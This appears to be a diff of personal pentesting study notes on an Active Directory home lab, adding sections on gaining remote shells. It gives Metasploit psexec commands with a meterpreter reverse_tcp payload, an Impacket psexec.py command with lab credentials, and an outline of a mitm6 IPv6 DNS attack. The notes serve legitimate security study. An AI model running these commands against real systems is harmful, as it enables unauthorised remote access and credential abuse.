@@ -471,7 +471,7 @@ attack steps:
 `nmap --script=smb2-security-mode.nse -p445 <DomainControllerIP> -Pn`
 `-Pn` -->  treat all hosts as online
 =>
-`nmap --script=smb2-security-mode.nse -p445 127.16.214.128 -Pn`
+`nmap --script=smb2-security-mode.nse -p445 172.16.214.128 -Pn`
 This is the message that we are looking for:
 ![[Pasted image 20240226103728.png]]
 
@@ -516,3 +516,49 @@ if we type `help` -->  we can see all the commands that we can use
 ##### SMB Relay Mitigation
 <span style="background:#fff88f">Possibile mitigation:</span>
 ![[Pasted image 20240226110048.png]]
+
+#### Gaining Shell Access
+we can do in different ways
+
+##### Metasploit
+`msfconsole`
+`search psexec`    and look for exploit/windows/smb/psexec
+`use <number>`
+`options`
+`set payload windows/x64/meterpreter/reverse_tcp`
+`set RHOST <THE PUNISHER IP>`      172.16.214.130
+`set smbdomain MARVEL.local`
+`set smbuser fcastle`
+`set smbpass Password1`
+`run`
+
+> [!warning] If it fails:
+> type `show targets`
+> and try with PowerShell or Native upload
+
+##### psexec.py
+`sudo psexec.py MARVEL/fcastle:'Password1'@172.16.214.130`
+[[cheet#psexec.py]]
+![[Pasted image 20240226112845.png]]
+
+#### IPv6 Attacks
+In some machines IPv6:
+-  is enabled
+- but is not used
+=>
+if IPv6 is on:
+<span style="background:#fff88f">who is doing DNS resolution for it?</span>
+                 <span style="color:#00b050">usually no one</span>
+=>
+we can set up a fake DNS -->  using [[cheet#mitm6]]
+
+##### mitm6
+follow all the steps --> [[cheet#mitm6|here]]
+if you reboot THEPUNISHER:
+- you will obtain a lot of information
+- if you go inside your lootme_folder you will find some of them 
+
+##### IPv6 Mitigation
+![[Pasted image 20240226122019.png]]
+
+
